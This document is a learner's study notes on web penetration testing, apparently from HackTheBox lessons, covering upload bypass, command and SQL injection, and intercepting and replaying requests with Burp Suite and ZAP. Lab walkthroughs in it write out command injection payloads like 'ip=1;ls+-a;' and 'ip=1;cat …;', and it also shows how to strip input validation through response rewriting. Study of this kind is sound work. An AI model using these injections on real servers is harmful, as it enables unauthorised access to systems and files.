+Another common way to gain control over web applications is through uploading malicious scripts. If the web application has a file upload feature and does not properly validate the uploaded files we may upload malicious script i.e. a PHP script which allows us to execute commands on the remote server.
+
+*Even though this is a basic vulnerability many developers are not aware of these threats so they do not properly check and validate uploaded files. Furthermore some developers do perform checks and attempt to validate uploaded files but these checks can often be bypassed which would still allow us to upload malicious scripts.
+
+*For example the WordPress Plugin responsive thumbnail slider 1.0 can be exploited to upload any arbitrary file including malicious scripts by uploading a file with a double extension i.e. shell.php.jpg. There's even a Metasploit module that allows us to exploit this vulnerability easily.
+
+------------------------------
+
+
+Command Injection:
+
+*Many web applications execute local Operating System commands to perform certain processes. For example a web application may install a plugin of our choosing by executing an OS command that downloads that plugin using the plugin name provided. If not properly filtered and sanitized attackers may be able to inject another command to be executed alongside the originally intended command i.e. as the plugin name which allows them to directly execute commands on the back end server and gain control over it. This type of vulnerability is called command injection.
+
+*This vulnerability is widespread as developers may not properly sanitize user input or use weak tests to do so allowing attackers to bypass any checks or filtering put in place and execute their commands.
+
+*For example the WordPress plugin Plainview activity monitor 20161228 has a vulnerability that allows attackers to inject their command in the IP value by simply adding "| COMMAND" after the IP value.
+
+------------------------------
+
+
+SQL Injection:
+
+*Another very common vulnerability in web applications is a SQL injection vulnerability. Similarly to a command injection vulnerability this vulnerability may occur when the web application executes a SQL query including a value taken from user supplied input.
+
+*For example in the database section we saw an example of how a web application would use user input to search within a certain table with the following line of code:
+
+		$query = "select * from users where name like '%$searchInput%'";
+
+*If the user input is not properly filtered and validated as is the case with command injections we may execute another SQL query alongside this query which may eventually allow us to take control over the database and its hosting server.
+
+*For example the same previous college management system 1.2 suffers from a SQL injection vulnerability in which we can execute another SQL query that always returns true meaning we successfully authenticated which allows us to log in to the application. We can use the same vulnerability to retrieve data from the database or even gain control over the hosting server.
+
+*We will see these vulnerabilities again and again in our learning journey and real world assessments. It is important to become familiar with each of these as even a basic understanding of each will give us a leg up in any information security realm.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Public Vulnerabilities:
+
+*The most critical back end component vulnerabilities are those than can be attacked externally and can be leveraged to take control over the back end server without needing local access to that server i.e. external penetration testing. These vulnerabilities are usually caused by coding mistakes made during the development of a web applications back end components. So there is a wide variety of vulnerability types in this area ranging from basic vulnerabilities that can be exploited with relative ease to sophisticated vulnerabilities requiring deep knowledge of the entire web application.
+
+---------------------------
+
+
+Public CVE:
+
+*As many organizations deploy web applications that are publicly used like open source and proprietary web application these web application tend to be tested by many organization and experts around the world. This leads to frequently uncovering a large number of vulnerabilities most of which get patched and then shared publicly and assigned a CVE (Common Vulnerabilities and Exposure) record and score.
+
+*Many penetration testers also make proof of concept exploits to test whether a certain public vulnerability can be exploited and usually make these exploits available for public use, for testing and educational purposes. This makes searching for public exploits the very first step we must go through for web applications.
+
+*The first step is to identify the version of the web application. This can be found in many locations like the source code of the web application. For open source web applications we can check the repository of the web application and identify where the version number is shown e.g. in version.php page and then check the same page on our target web application.
+
+*once we identify the web application version we can search Google for public exploits for this version of the web application. We can also utilize online exploit databases like Exploit DB, Rapid7 DB, or Vulnerability Lab. 
+
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+
+
+
+
+
+Using Web Proxies:
+
+
+Intro to Web Proxies:
+
+*Today the modern web and mobile applications work by continuously connecting to back end servers to send and receive data and then processing this data on the users device like their web browsers or mobile phones. With most applications heavily relying on back end servers to process data testing and securing the back end servers is quickly becoming more important.
+
+*Testing web requests to back end servers make up the bulk of Web Application Penetration Testing which includes concepts that apply to both web and mobile applications. To capture the requests and traffic passing between applications and back end servers and manipulate these types of requests for testing purposes we need to use Web Proxies.
+
+------------------------
+
+
+What are Web Proxies?
+
+*Web proxies are specialized tools that can be set up between a browser/mobile application and a back end server to capture and view all the web requests being sent between both ends essentially acting as man-in-the-middle tools. While other network sniffing applications like Wireshark operate by analyzing all local traffic to see what is passing through a network, Web proxies mainly work with web ports such as but not limited to HTTP/80 and HTTPS/443.
+
+Web proxies are considered among the most essential tools for any web pentester. They significantly simplify the process of capturing and replaying web requests compared to earlier CLI based tools. Once a web proxy is set up we can see all HTTP requests made by an application and all of the responses sent by the back end server. Furthermore we can intercept a specific request to modify its data and see how the back end server handles them which is an essential part of any web penetration test.
+
+------------------------
+
+
+Use of Web Proxies:
+
+*While the primary use of web proxies is to capture and replay HTTP requests they have many other features that enable different uses for web proxies. The following list shows some of the other tasks we may use web proxies for:
+
+		Web application vulnerability scanning
+
+		Web fuzzing
+
+		Web crawling
+
+		Web application mapping
+
+		Web request analysis
+
+		Web configuration testing
+
+		Code reviews
+
+--------------------------
+
+
+Burp Suite:
+
+*Burp Suite is the most common web proxy for web penetration testing. It has an excellent user interface for its various features and even provides a built in chromium browser to test web applications. Certain Burp features are only available in the commercial version Burp Pro/Enterprise but even the free version is an extremely powerful testing tool to keep in our arsenal.
+
+--------------------------
+
+
+OWASP Zed Attack Proxy (ZAP):
+
+*Is another common web proxy tool for web penetration testing. ZAP is a free and open source project initiated by the OWASP and maintained by the community so it has no paid only features as Burp does. It has grown significantly over the past few years and is quickly gaining market recognition as the leading open source web proxy tool.
+
+*Just like Burp, ZAP provides various basic and advanced features that can be utilized for web pentesting. ZAP also has certain strengths over Burp. The main advantage of ZAP over Burp is being a free open source project which means that we will not face any throttling or limitations in our scans and that are only lifted with a paid subscription.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+Web Proxy:
+
+
+Intercepting Web Requests:
+
+*Not that we have set up our proxy we can use it to intercept and manipulate various HTTP requests sent by the web application we are testing. 
+
+-----------------------
+
+
+ZAP:
+
+*In ZAP interception is off by default as shown by the green button on the top bar. We can click on this green button to turn the request interception on or off. 
+
+*Then we can start the preconfigured browser and revisit the exercise webpage. We will see the intercepted request in the top right pane and we can click on the step on the right of the red break button to forward the request.
+
+*ZAP also has a powerful feature called heads up display (HUD) which allows us to control most of the main ZAP features from right within the preconfigured browser. We can enable the HUD by clicking its button at the end of the top menu bar.
+
+*For intercepting requests we can click on the second button from the top on the left pane to turn request interception on.
+
+*Now once we refresh the page or send another request the HUD will intercept the request and will present it to us for action.
+
+*We can choose to step to send the request and examine its response and break any further requests or we can choose to continue the pages functionality while continue is useful when we are only interested in a single request and can forward the remaining requests once we reach our target request.
+
+-----------------------
+
+
+Manipulating Intercepted Requests:
+
+*Once we intercept the request it will remain hanging until we forward it as we did above. We can examine the request, manipulate it to make any changes we want, and then send it to its destination. This helps us better understand what information a particular web application is sending in its web requests and how it may respond to any changes we make in that request.
+
+*There are numerous applications for this in Web Penetration Testing such as testing for:
+
+		SQL Injections
+
+		Command Injections
+
+		Upload bypass
+
+		Authentication bypass
+
+		XSS
+
+		XXE
+	
+		Error handling
+
+		Deserialization
+
+*And many other potential web vulnerabilities as we will see in other web modules. 
+
+*Let us turn request interception back on in the tool of our choosing, set the IP value on the page, then click on the Ping button. Once our request is intercepted we should get a similar HTTP request to the following:
+
+		POST /ping HTTP/1.1
+		Host: 46.101.23.188:30820
+		Content-Length: 4
+		Cache-Control: max-age=0
+		Upgrade-Insecure-Requests: 1
+		Origin: http://46.101.23.188:30820
+		Content-Type: application/x-www-form-urlencoded
+		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
+		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+		Referer: http://46.101.23.188:30820/
+		Accept-Encoding: gzip, deflate
+		Accept-Language: en-US,en;q=0.9
+		Connection: close
+
+		ip=1
+
+*Typically we can only specify number sin the IP field using the browser as the web page prevents us from sending any non numeric characters using front end JavaScript. However with the power of intercepting and manipulating HTTP requests we can try using other characters to break the application. Breaking the request/response flow by manipulating the target parameter, not damaging the target web application. If the web application does not verify and validate the HTTP requests on the back end we may be able to manipulate it and exploit it.
+
+*So let us change the IP parameters values from "1" to ";ls;" and see how the web application handles out input. Once we click continue/forward we will see that the response changed from the default ping output to the ls output meaning that we successfully manipulated the request to inject our command.
+
+---------------------------------------------------
+
+
+Exercise:
+
+Try intercepting the ping request on the server shown above, and change the post data similarly to what we did in this section. Change the command to read 'flag.txt'
+
+
+1. First I will spawn my target IP and then I will open Burp Suite to intercept its data.
+
+2. Now with Burp Suite up I will input my target IP into my browser
+
+3. Now I will go into my browsers Proxy setting and ensure the proxy is routed to Burp Suites IP and port.
+
+4. Now I go back to burp suite and check the post request. 
+
+5. Now I configure my own post request by right clicking on the post request box and selecting "open/resend with request editor".
+
+6. Now that I am in the request editor I will type "ip=;flag.txt;" to get the response for the flag.txt.
+
+7. The response is HTB{1n73rc3p73d_1n_7h3_m1ddl3}, which means I have successfully captured the flag. 
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+Intercepting Responses:
+
+*In some instances we may need to intercept the HTTP responses from the server before they reach the browser. This can be useful when we want to change how a specific web page looks like enabling certain disabled fields or showing certain hidden fields which may help us in out penetration testing activities.
+
+*So lets see how we can achieve that with the exercise we testing in the previous section.
+
+*In our previous exercise the IP field only allowed us to input numeric values. If we intercept the response before it reaches our browser we can edit it to accept any value which would enable us to input the payload we used last time directly.
+
+
+Burp:
+
+*In Burp we can enable response interaction by going to (proxy>options) and enabling intercept response under intercept server response.
+
+*After that we can enable request interception once more and refresh the page with "ctrl+shift+r" in our browser to force a full refresh. When we go back to Burp we should see the intercepted request and we can click on forward. Once we forward the request we'll see our intercepted response.
+
+*Lets try changing the type="number" to type="text" which should enable us to write any value we want. We will also change the maxlength="3" to maxlength-"100" so we can enter longer input:
+
+		<input type="text" id="ip" name="ip" min="1" max="255" maxlength="100"
+		    oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"
+		    required>
+
+*Now once we click on forward again we can go back to Firefox to examine the edited response.
+
+*As we can see we could change the way the page is rendered by the browser and can now input any value we want. We may use the same technique to persistently enable any disabled HTML buttons by modifying their HTML code.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+Automatic Modification:
+
+*We may want to apply certain modifications to all outgoing HTTP requests or all incoming HTTP responses in certain situations. In these cases we can utilize automatic modifications based on rules we set so the web proxy tools will automatically apply them.
+
+
+Automatic Request Modification:
+
+*Let us start with an example of automatic request modification. We can choose to match any text within our requests either in the request header or request body and then replace them with different text. For the sake of demonstration lets replace our User-Agent with HackTheBox Agent 1.0 which may be handy in cases where we may be dealing with filters that block certain user agents.
+
+
+Burp Match and Replace:
+
+*We can go to (proxy>options>match and replace) and clock on add in Burp. As the below screenshot shows we will set the following options:
+
+		Type: Request header		Since the change we want to make will be in the request header and not in its body
+
+		Match: ^User-Agent.*$		The regex pattern that matches the entire line with User-Agent in it.
+
+		Replace: User-Agent: HackTheBox Agent 1.0	This is the value that will replace the line we matched above
+
+		Regex match: True		We don't know the exact User-Agent string we want to replace so we'll use regex to match any value that matches the pattern we specified above.
+
+*Once we enter the above options and clock ok our new match and replace option will be added and enabled and will start automatically replacing the User-Agent header in our requests with our new User-Agent. We can verify that by visiting any website using the preconfigured Burp browser and reviewing the intercepted request. We will see that our User-Agent has indeed been automatically replaced.
+
+
+Automatic Response Modification:
+
+*The same concept can be used with HTTP responses as well. In the previous section you may have noticed when we intercepted the response that the modifications we made to the IP field were temporary and were not applied when we refreshed the page unless we intercepted the response and added them again. To solve this we can automate response modification similarly to what we did above to automatically enable them again. To solve this we can automate response modification similarly to what we did above to automatically enable any characters in the IP field for easier command injection.
+
+*Let us go back to (proxy>options>match and replace) in Burp to add another rule. This time we will use the type of response body since the change we want to make exists in the responses body and not in its headers. In this case we do not have to use regex as we know that exact string we want to replace though it is possible to use regex to do the same thing if we prefer.
+
+		Type: Response body.
+		Match: type="number".
+		Replace: type="text".
+		Regex match: False.
+
+*Try adding another rule to change maxlength="3" to maxlength="130".
+
+*Now once we refresh the page with "ctrl+shift+r" we'll see that we can add any input to the input field and this should persist between page refreshes as well.
+
+*We can now click on ping and our command injection should work without intercepting and modifying the request.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+Repeating Requests:
+
+*In the previous sections we successfully bypassed the input validation to use a non-numeric input to reach command injection on the remote server. If we want to repeat the same process with a different command we would have to intercept the request again, provide a different payload, forward it again, and finally check our browser to get the final result. 
+
+*As you can imagine if we would do this for each command it would take us forever to enumerate a system as each command would require 5-6 steps to get executed. However for such repetitive tasks we can utilize request repeating to make this process significantly easier. 
+
+*Request repeating allows us to resend any web request that has previously gone through the web proxy. This allows us to make quick changes to any request before we send it then get the response within our tools without intercepting and modifying each request.
+
+
+Proxy History:
+
+*To start we can view the HTTP requests history in Burp at (proxy>HTTP History).
+
+*If we click on any request in the history in burp tool its details will be shown.
+
+
+Burp:
+
+*Once we locate the request we want to repeat we can click "ctrl+r" in burp to send it to the repeater tab and then we can either navigate to the repeater tab or click "ctrl+shift+r" to go directly. Once in repeater we can click on send to send the request. We can also right click on the request and select change request method to change the HTTP method between POST/GET without having to rewrite the entire request.
+
+----------------------------------------
+Exercise:
+
+Try using request repeating to be able to quickly test commands. With that, try looking for the other flag.
+
+1. First I open Burp Suite and ensure the interception is off. Then I copy and past my target IP into my browsers URL.
+
+2. Now I press anything on the target website so that I can get a successful POST request.
+
+3. Then I go to burpsuite, proxy, then HTTP history and I confirm that I have a POST request.
+
+4. I click on the POST request and send it to the repeater, then I go to the repeater tab in burpsuite.
+
+5. From the repeater tab I click send to send the request.
+
+6. Now i go to the Request part of the repeater and change the bottom "ip=" code to "ip=1;ls+-a;" to list the contects of the url and look for any folders that might be displayed. 
+
+7. If a folder is displayed I can use "ip=1;ls <the name of the folder>;" to open the folder. 
+
+8. If a .txt file is displayed I can use "ip=1;cat <the .txt file>;" or If the .txt file is in a folder that was opened then I can use "ip=1;cat <the name of the folder>/<the name of the .txt file/index.js;".
+
+9. Now I can look through the files and folders for whatever information I want and makes this a successful command injection exercise
